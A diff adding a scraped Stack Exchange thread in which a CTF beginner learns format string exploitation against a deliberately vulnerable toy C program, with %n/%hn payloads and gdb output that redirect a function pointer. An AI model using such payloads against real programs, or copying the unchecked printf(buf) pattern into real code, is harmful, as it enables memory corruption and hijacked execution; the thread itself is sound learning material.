@@ -1,0 +1,62 @@
+{
+    "title": "Newbie problems exploiting a format string vulnerability",
+    "link": "https://reverseengineering.stackexchange.com/questions/25257/newbie-problems-exploiting-a-format-string-vulnerability",
+    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I encountered a print format vulnerability challenge in a CTF. I don't know anything about these vulnerabilities, so I'm working my way through Saif El-Sherei's format string exploitation tutorial from exploit-db.com (\n  <a href=\"https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf\" rel=\"nofollow noreferrer\">\n   https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf\n  </a>\n  ). But, I'm getting stuck really early on. I'm hoping someone can point out where I'm going wrong.\n </p>\n <p>\n  Here's some code I wrote:\n </p>\n <pre><code>#include <stdio.h>\n#include <stdlib.h>\n\nvoid nicefunction()\n{\n        printf(\"you are in the nice function!\n\");\n}\nvoid notnicefunction()\n{\n        printf(\"you are in the NOT nice function!\n\");\n}\nint foo()\n{\n  void (*fptr)() = &nicefunction;\n  char buf[100];\n\n  puts(\"Please enter a string. \");\n  fgets(buf,80,stdin);\n  puts(\"Here's your string\");\n  printf(buf);\n  puts(\"\nNow we call the nice function\");\n  (*fptr)();\n  return 0;\n}\n\nint main(int argc, char **argv)\n{\n  foo();\n}\n</code></pre>\n <p>\n  My goal is to craft an input string that I can use to change fptr to point to notnicefunction. I compiled it with:\n  <code>\n   gcc -m32 -g test.c -fno-stack-protector -z execstack -o test\n  </code>\n </p>\n <p>\n  I ran the binary under gdb and added before and after breakpoints. When I enter the string \"AAAA\" and then do x/20xw $esp afterwards, I see my 0x41414141 in the stack, at 0xffffd018. If I rerun and enter the string \"AAAA %6$x\" I get AAAA 41414141. So far so good.\n </p>\n <p>\n  Now I want to find the address of fptr. Using nm, I see that it should contain the value of 0x0804849b (the address of nicefunction). My goal is to change it to 0x080484b4, the address of notnicefunction. I rerun with AAAA, and then examine the stack until I find the address that contains 0x0804849b. That's 0xffffd07c, 0x64 (100d) words deeper in the stack from the start of buf. Which makes sense.\n </p>\n <p>\n  I'd like to control the contents of fptr by using %n. So I crafted this input string: \\x7c\\xd0\\xff\\xff\\xff\\xffAAAA%5$x%n. I think this should change the contents of 0xffffd07c to 13d. But instead I segfault in the printf.\n </p>\n <p>\n  Where am I going wrong?\n </p>\n <p>\n  <strong>\n   UPDATE:\n  </strong>\n  I tried writing my fptr address into the start of the buffer, just to see if I was writing the address correctly. But when I checked it in gdb, it had the ASCII representation in it:\n </p>\n <pre><code>(gdb) x/20xw $esp+8\n0xffffd018: 0x6337785c  0x3064785c  0x6666785c  0x6666785c\n</code></pre>\n <p>\n  So the problem is that bash doesn't like my hex literals. I guess I could fix this with redirection from a file. But if anyone knows of a cleaner way to handle this, I'd love to know about it.\n </p>\n <p>\n  <strong>\n   MOAR UPDATE\n  </strong>\n  : Pawel's comment below got me past the how-do-I-get-hex-bytes-into-this-binary hurdle. But I was still segfaulting on my %n. But the segfaults went away when I changed %5$x %n to %x %x %x %x %x %n. Now I am able to (sort of) control the contents of arbitrary stack memory. Whoohoo!\n </p>\n</div>\n</body></html>",
+    "votes": "2",
+    "answers": 2,
+    "views": "287",
+    "tags": [
+        "linux",
+        "c",
+        "exploit"
+    ],
+    "user": "Polly",
+    "time": "Jun 10, 2020 at 22:02",
+    "comments": [
+        {
+            "user": "Paweł Łukasik",
+            "text": "<html><body><span class=\"comment-copy\">\n how are you passing your data to this binary? Try something like\n <code>\n  echo -e \\x7c\\xd0\\xff\\xff\\xff\\xffAAAA%5$x%n | ./test\n </code>\n</span>\n</body></html>",
+            "time": null
+        },
+        {
+            "user": "Polly",
+            "text": "<html><body><span class=\"comment-copy\">\n Pawel's comment pointed me on the way, with one tweak because I'm running under gdb: echo -n -e '\\x7c\\xd0\\xff\\xff. %x %x %x %x %x %n' > /tmp/xxx and then r < /tmp/xxx at the gdb prompt.\n</span>\n</body></html>",
+            "time": null
+        },
+        {
+            "user": "multithr3at3d",
+            "text": "<html><body><span class=\"comment-copy\">\n If you want a realistic challenge, compile with the default flags.\n</span>\n</body></html>",
+            "time": null
+        }
+    ],
+    "answers_data": [
+        {
+            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  The input string that finally let me execute the not nice function was echo -n -e '\\x7c\\xd0\\xff\\xffJUNK\\x7e\\xd0\\xff\\xff. %x %x %x %x %33929x %hn' > /tmp/xxx\n </p>\n <p>\n  This gave me:\n </p>\n <pre><code>22    (*fptr)();\n(gdb) x/4xw 0xffffd070\n0xffffd070: 0x00000001  0x00000003  0xf7e25a50  0x080484b4\n(gdb) c\nContinuing.\nyou are in the NOT nice function!\n</code></pre>\n</div>\n</body></html>",
+            "votes": "1",
+            "user": "Polly",
+            "time": "Jun 10, 2020 at 22:01",
+            "is_accepted": false,
+            "comments": [
+                {
+                    "user": "multithr3at3d",
+                    "text": "<span class=\"comment-copy\">I don't think you need the address twice since you are only using one %n</span>",
+                    "time": null
+                }
+            ]
+        },
+        {
+            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I am not sure the\n  <code>\n   %n\n  </code>\n  takes the next argument after the\n  <code>\n   %5$x\n  </code>\n  .\n </p>\n <p>\n  Try\n  <code>\n   \\x7c\\xd0\\xff\\xffAAAA%6$n\n  </code>\n  . Seemed to work for me.\n </p>\n</div>\n</body></html>",
+            "votes": "0",
+            "user": "Artelius",
+            "time": "Jun 9, 2020 at 23:51",
+            "is_accepted": false,
+            "comments": [
+                {
+                    "user": "Polly",
+                    "text": "<span class=\"comment-copy\">Thanks for the suggestion ... but I tried it and no joy.</span>",
+                    "time": null
+                }
+            ]
+        }
+    ]
+}
